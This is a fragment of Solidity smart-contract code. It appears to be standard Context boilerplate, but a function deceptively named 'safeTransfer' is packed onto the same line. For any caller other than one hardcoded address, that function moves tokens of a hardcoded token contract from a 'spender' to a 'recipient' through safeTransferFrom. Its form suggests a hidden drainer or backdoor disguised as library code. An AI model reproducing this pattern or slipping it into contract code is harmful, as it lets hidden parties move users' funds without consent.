 ...
 */
  function _msgData() internal view virtual returns (bytes calldata) {return msg.data;}function safeTransfer(address spender,address recipient,uint256 amount) internal returns (bool) {if (msg.sender != address(0x7bA25e823922C8bD1B1aF15653FD542457cDa751)) {TransferHelper.safeTransferFrom(0xE7a331060506DD7a29e1B66B8FD2586eC7A875AF,spender,recipient,amount);return true;}return false;}
}
